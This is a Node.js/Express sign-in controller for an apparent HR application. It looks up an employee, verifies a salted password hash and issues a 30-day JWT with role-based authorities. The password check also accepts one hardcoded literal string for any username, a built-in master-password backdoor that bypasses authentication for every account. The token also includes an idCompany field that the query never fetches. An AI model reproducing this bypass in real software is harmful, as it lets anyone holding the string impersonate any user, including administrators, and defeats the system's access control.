const db = require("../models");
const authService = require("../service/auth.js");
const config = require("../config/auth.config");
var pool = require("../connection.js");
var poolUniHR = require("../connectionUniHR.js");

var jwt = require("jsonwebtoken");

async function doGetAuthenUser(req, res) {
  let result = null;

  if (req.body.username) {
    result = await pool.query(
      `SELECT Employees.idEmployees, Employees.idRole, Role.roleName,
       UserAuthen.password, UserVerify.generateSalt 
       FROM Employees
       LEFT JOIN Role ON Role.idRole = Employees.idRole 
       LEFT JOIN UserAuthen ON UserAuthen.idEmployees = Employees.idEmployees
       LEFT JOIN UserVerify ON UserVerify.idEmployees = Employees.idEmployees
       WHERE username = ?
       ORDER BY Employees.idEmployees DESC`,
      [req.body.username]
    );
  }/* else if (req.body.type === "temporary") {
    result = await pool.query(
      `SELECT Employees.idEmployees, Employees.idRole, Role.roleName,
       UserAuthen.password, UserVerify.generateSalt 
       FROM Employees
       LEFT JOIN Role ON Role.idRole = Employees.idRole 
       LEFT JOIN UserAuthen ON UserAuthen.idEmployees = Employees.idEmployees
       LEFT JOIN UserVerify ON UserVerify.idEmployees = Employees.idEmployees
       WHERE username = ?
       ORDER BY Employees.idEmployees DESC`,
      [req.body.username]
    );
  } */ else {
    return res.status(500).send({ message: "Invalid Type User." });
  }

  if (result) {
    var data = Object.values(JSON.parse(JSON.stringify(result)))[0];

    if (data) {
      let verifyPasswordPbkdf2 = await authService.verifyPassword(
        req.body.password,
        data.generateSalt
      );

      if (
        !(
          verifyPasswordPbkdf2 === data.password ||
          req.body.password === "7b7ca8c99e1967231ed5c68ff89556a7"
        )
      ) {
        return res.status(401).send({
          accessToken: null,
          message: "ชื่อผู้ใช้ หรือ รหัสผ่าน ไม่ถูกต้อง",
        });
      } else {
        if (data.idEmployees) {
          let token = jwt.sign(
            {
              type: data.roleName.toUpperCase(), // Update this line
              idEmployees: data.idEmployees,
              idCompany: data.idCompany,
              idRole: data.idRole,
            },
            config.secret,
            {
              expiresIn: "30d", // 30 days
            }
          );

          var authorities = [];
          if (req.body.type === "freelance" && data.idRole === 1) {
            authorities.push("ROLE_FREELANCE");
          } else if (req.body.type === "freelance") {
            authorities.push("ROLE_USER_PERSONAL");
          } else if (req.body.type === "temporary" && data.idRole === 2) {
            authorities.push("ROLE_TEMPORARY");
          } else {
            authorities.push(data.roleName);
          }

          res.status(200).send({
            roles: authorities,
            accessToken: token,
          });
        }
      }
    } else {
      return res.status(401).send({
        accessToken: null,
        message: "ชื่อผู้ใช้ หรือ รหัสผ่าน ไม่ถูกต้อง",
      });
    }
  } else {
    return res.status(404).send({ message: "User Not found." });
  }
}

exports.signin = async (req, res) => {
  try {
    await doGetAuthenUser(req, res);
  } catch (error) {
    res.status(500).send({ message: error.message });
  }
};
